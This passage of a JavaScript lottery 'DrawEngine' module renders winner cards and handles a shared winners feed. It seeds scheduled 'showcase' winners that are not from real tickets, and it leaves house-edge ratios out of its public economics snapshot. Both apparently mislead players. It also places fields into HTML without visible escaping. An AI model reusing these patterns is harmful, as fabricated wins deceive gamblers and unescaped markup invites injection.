        <article class="jackpot-win-card${shareCount > 1 ? ' jackpot-win-shared' : ''}" data-draw-id="${w.drawId || ''}" data-winner-ts="${w.timestamp}">
          <div class="jackpot-win-banner">${headline}</div>
          <div class="jackpot-win-body">
            <div class="jackpot-win-amount">${shareCount > 1 ? eachLabel : formatWinnerPrize(w)}</div>
            <div class="jackpot-win-meta">
              <strong>${w.drawName}</strong>
              <span class="jackpot-win-jackpot">Jackpot at draw: <em>${formatUsd(jackpotAmt)}</em></span>
              <span class="jackpot-win-share">${shareNote}</span>
              <span class="jackpot-win-match">6 of 6 matched</span>
              <span class="jackpot-win-numbers">Winning numbers: ${nums}</span>
              ${renderCoWallets(wallets, shareCount > 1 ? eachLabel : null)}
            </div>
            <div class="jackpot-win-when">${when}</div>
          </div>
        </article>`;
      }

      const prizeClass = w.prizeType === 'free_ticket'
        ? ' winner-prize-ticket'
        : ' winner-prize-tier';
      return `
      <div class="winner-row winner-row-tier" data-winner-ts="${w.timestamp}">
        <div class="winner-prize${prizeClass}">${formatWinnerPrize(w)}</div>
        <div class="winner-meta">
          <span class="winner-tier-headline">${headline}</span>
          <strong>${w.drawName}</strong>
          <span class="winner-tier-note">${w.matchCount || 0} of 6 matched</span>
          <span>Winning: ${nums}</span>
          <span class="winner-wallet">${wallets[0]}</span>
        </div>
        <div class="winner-time">${when}</div>
      </div>`;
    }).join('');
  }

  function updateWinnersLiveBadge() {
    const badge = document.getElementById('winnersLiveBadge');
    if (!badge) return;
    badge.innerHTML = '<span data-icon="calendar" data-icon-size="12"></span> Posted when draws close';
    badge.className = 'winners-draw-badge';
    window.Icons?.hydrate?.(badge);
  }

  function highlightLatestWinner() {
    const el = document.getElementById('winnersList');
    const row = el?.querySelector('.jackpot-win-card, .winner-row');
    if (!row) return;
    row.classList.add('winner-row-new');
    setTimeout(() => row.classList.remove('winner-row-new'), 3200);
  }

  function tick() {
    checkDraws();
    updateDrawCardTimers();
    updateFeaturedDraw();
  }

  let sharedAuthority = false;

  function applySharedWinners(rows) {
    if (!Array.isArray(rows) || !rows.length) return;
    sharedAuthority = true;
    if (showcaseTimer) {
      clearTimeout(showcaseTimer);
      showcaseTimer = null;
    }
    const mapped = rows.map((w) => {
      try {
        if (w.payloadJson) {
          const parsed = JSON.parse(w.payloadJson);
          return {
            ...parsed,
            winner: parsed.winner || { wallet: w.walletDisplay || w.wallet },
            coWinners: parsed.coWinners || w.coWinners,
            numbers: parsed.numbers || w.numbers || [],
          };
        }
      } catch { /* */ }
      return {
        drawId: w.drawId,
        drawName: w.drawName,
        prize: w.prizeUsd,
        paidUsd: w.prizeUsd,
        prizeLabel: w.prizeLabel,
        prizeType: w.prizeType || 'cash',
        matchCount: w.matchCount,
        shareCount: w.shareCount || 1,
        shareIndex: w.shareIndex || 1,
        isJackpot: !!w.isJackpot || w.matchCount === 6,
        jackpotTierWin: !!w.isJackpot || w.matchCount === 6,
        jackpotAmount: w.jackpotAmount,
        advertisedPrize: w.jackpotAmount || w.advertisedPrize,
        jackpotLabel: w.jackpotLabel,
        headline: w.headline,
        shareNote: w.shareNote,
        scheduleLabel: w.scheduleLabel,
        drawDateLabel: w.drawDateLabel,
        source: w.source || 'showcase',
        timestamp: w.timestamp,
        winner: { wallet: w.walletDisplay || w.wallet },
        coWinners: w.coWinners,
        numbers: w.numbers || [],
        fromRealTicket: false,
      };
    });
    SecureStorage.setJSON(STORAGE_WINNERS, mapped.slice(0, 50));
    renderWinners();
    updateWinnersLiveBadge();
  }

  function init() {
    loadState();
    loadEconomics();
    ensureEconomicsWindow();
    normalizeStoredWinners();
    purgeLiveFeedWinners();
    syncWalletTicketsToDraws();
    checkDraws();
    renderDrawCards();
    updateFeaturedDraw();
    renderWinners();
    updateWinnersLiveBadge();

    tickTimer = setInterval(tick, 1000);

    window.addEventListener('draw-completed', (e) => {
      const w = e.detail;
      if (w.source === 'scheduled') renderDrawCards();
      if (w.source !== 'showcase') handleWinnerPublished(w);
    });

    window.addEventListener('live-feed-sync', (ev) => {
      if (ev.detail?.shared && ev.detail.winners?.length) {
        applySharedWinners(ev.detail.winners);
      }
    });

    setTimeout(() => {
      if (sharedAuthority || window.LiveFeed?.isShared?.()) return;
      seedWinnersIfNeeded();
      scheduleShowcaseWin();
      renderWinners();
    }, 5500);
  }

  function stop() {
    if (tickTimer) clearInterval(tickTimer);
    if (showcaseTimer) clearTimeout(showcaseTimer);
  }

  return {
    init, stop, getTiers: () => DRAW_TIERS, getSelectedDraw, setSelectedDraw,
    registerTicket, syncWalletTicketsToDraws, getSelectedDrawId: () => selectedDrawId, formatUsd,
    applySharedWinners,
    getEconomics: () => {
      ensureEconomicsWindow();
      // Public snapshot: no house-edge ratios
      return {
        dailyInflowUsd: economicsState.dailyInflowUsd,
        lifetimeInflowUsd: economicsState.lifetimeInflowUsd,
        dailyOutflowUsd: economicsState.dailyOutflowUsd,
        lifetimeOutflowUsd: economicsState.lifetimeOutflowUsd,
      };
    },
  };
})();

window.DrawEngine = DrawEngine;
